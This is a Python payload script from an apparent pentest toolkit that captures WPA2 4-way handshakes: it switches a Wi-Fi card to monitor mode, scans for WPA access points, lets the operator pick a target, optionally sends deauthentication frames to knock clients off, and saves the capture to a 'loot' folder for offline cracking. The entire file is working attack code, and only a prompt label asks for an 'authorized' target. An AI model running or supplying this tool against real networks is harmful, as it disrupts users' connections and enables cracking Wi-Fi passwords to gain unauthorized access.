#!/usr/bin/env python3
# @active: true
# @name: WPA2 Handshake Hunter
# @desc: Captures WPA2 4-way handshakes by scanning for APs, selecting a target, discovering connected clients, sending targeted deauth, and captu...
# @category: wifi
# @danger: true
# @inputs: [{"name":"scan_seconds","label":"AP scan duration","type":"number","default":"15"},{"name":"capture_seconds","label":"Capture duration","type":"number","default":"120"},{"name":"deauth","label":"Send deauthentication assist","type":"select","choices":["false","true"],"default":"false"}]

import csv
import os
import shutil
import signal
import subprocess
import sys
import time
from pathlib import Path

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))
from payloads._iface_helper import list_interfaces
from payloads._web_input import request_input


def choose_interface():
    items = [x for x in list_interfaces("wifi") if x.get("supports_monitor")]
    if not items:
        print("No monitor-capable Wi-Fi interface found", flush=True)
        return None
    choices = [{"value": x["name"], "label": f"{x['name']} · {x.get('bus') or 'unknown'}"} for x in items]
    return str(request_input("Select monitor-capable Wi-Fi interface", input_type="select", choices=choices))


def run(cmd, timeout=15, check=True):
    result = subprocess.run(cmd, text=True, capture_output=True, timeout=timeout)
    if check and result.returncode:
        raise RuntimeError((result.stderr or result.stdout or "command failed").strip())
    return result


def set_mode(iface, mode):
    for cmd in (["sudo", "-n", "ip", "link", "set", iface, "down"],
                ["sudo", "-n", "iw", "dev", iface, "set", "type", mode],
                ["sudo", "-n", "ip", "link", "set", iface, "up"]):
        run(cmd)


def stop_process(proc, sig=signal.SIGTERM):
    if proc and proc.poll() is None:
        os.killpg(proc.pid, sig)
        try:
            proc.wait(timeout=8)
        except subprocess.TimeoutExpired:
            os.killpg(proc.pid, signal.SIGKILL)


def parse_aps(path):
    aps = []
    if not path.exists():
        return aps
    with path.open(errors="replace", newline="") as source:
        for row in csv.reader(source):
            if not row or row[0].strip() == "Station MAC":
                break
            if len(row) < 14 or row[0].strip() == "BSSID":
                continue
            bssid, channel = row[0].strip().upper(), row[3].strip()
            if len(bssid) == 17 and channel.isdigit():
                aps.append({"bssid": bssid, "channel": channel, "privacy": row[5].strip(),
                            "power": row[8].strip(), "ssid": row[13].strip() or "<hidden>"})
    return aps


def main():
    for tool in ("airodump-ng", "aireplay-ng", "aircrack-ng", "iw", "ip"):
        if not shutil.which(tool):
            print(f"Missing required tool: {tool}", flush=True)
            return 127
    try:
        scan_seconds = min(60.0, max(5.0, float(sys.argv[1]) if len(sys.argv) > 1 else 15.0))
        capture_seconds = min(1800.0, max(10.0, float(sys.argv[2]) if len(sys.argv) > 2 else 120.0))
    except ValueError:
        print("Durations must be numeric", flush=True)
        return 2
    deauth = len(sys.argv) > 3 and sys.argv[3].lower() == "true"
    iface = choose_interface()
    if not iface:
        return 1
    loot = Path(os.environ["CITYPOP_LOOT"]) / "Handshakes"
    loot.mkdir(parents=True, exist_ok=True)
    scan_proc = capture_proc = None
    try:
        set_mode(iface, "monitor")
        stamp = time.strftime("%Y%m%d_%H%M%S")
        scan_prefix = loot / f"scan_{stamp}"
        scan_proc = subprocess.Popen(["sudo", "-n", "airodump-ng", "--write", str(scan_prefix),
                                      "--output-format", "csv", iface], stdout=subprocess.DEVNULL,
                                     stderr=subprocess.DEVNULL, start_new_session=True)
        print(f"Scanning on {iface} for {scan_seconds:g}s", flush=True)
        time.sleep(scan_seconds)
        stop_process(scan_proc)
        aps = [x for x in parse_aps(Path(f"{scan_prefix}-01.csv")) if "WPA" in x["privacy"]]
        if not aps:
            print("No WPA access points found", flush=True)
            return 0
        choices = [{"value": str(i), "label": f"{x['ssid']} · {x['bssid']} · ch{x['channel']} · {x['power']}dBm"}
                   for i, x in enumerate(aps)]
        selected = str(request_input("Select authorized handshake target", input_type="select", choices=choices))
        if not selected.isdigit() or int(selected) >= len(aps):
            print("Invalid target selection", flush=True)
            return 2
        ap = aps[int(selected)]
        capture_prefix = loot / f"handshake_{ap['bssid'].replace(':', '')}_{stamp}"
        cmd = ["sudo", "-n", "airodump-ng", "--bssid", ap["bssid"], "--channel", ap["channel"],
               "--write", str(capture_prefix), "--output-format", "pcap,csv", iface]
        capture_proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                        start_new_session=True)
        if deauth:
            print("Sending bounded deauthentication assist", flush=True)
            result = run(["sudo", "-n", "aireplay-ng", "--deauth", "5", "-a", ap["bssid"], iface],
                         timeout=30, check=False)
            if result.returncode:
                print(f"Deauthentication failed: {result.stderr.strip()}", flush=True)
        print(f"Capturing {ap['ssid']} for {capture_seconds:g}s", flush=True)
        deadline = time.monotonic() + capture_seconds
        cap = Path(f"{capture_prefix}-01.cap")
        found = False
        while time.monotonic() < deadline:
            time.sleep(min(5, deadline - time.monotonic()))
            if cap.exists():
                check = run(["aircrack-ng", str(cap)], timeout=20, check=False)
                found = "1 handshake" in check.stdout or "handshake" in check.stdout.lower() and "0 handshake" not in check.stdout.lower()
                print(f"capture_size={cap.stat().st_size} handshake={found}", flush=True)
                if found:
                    break
        print(f"Capture saved to {cap}; handshake_detected={found}", flush=True)
        return 0 if found else 1
    except (RuntimeError, subprocess.SubprocessError, OSError) as exc:
        print(f"Handshake capture failed: {exc}", flush=True)
        return 1
    finally:
        stop_process(scan_proc)
        stop_process(capture_proc, signal.SIGINT)
        try:
            set_mode(iface, "managed")
        except Exception as exc:
            print(f"Warning: failed to restore {iface}: {exc}", flush=True)


if __name__ == "__main__":
    raise SystemExit(main())
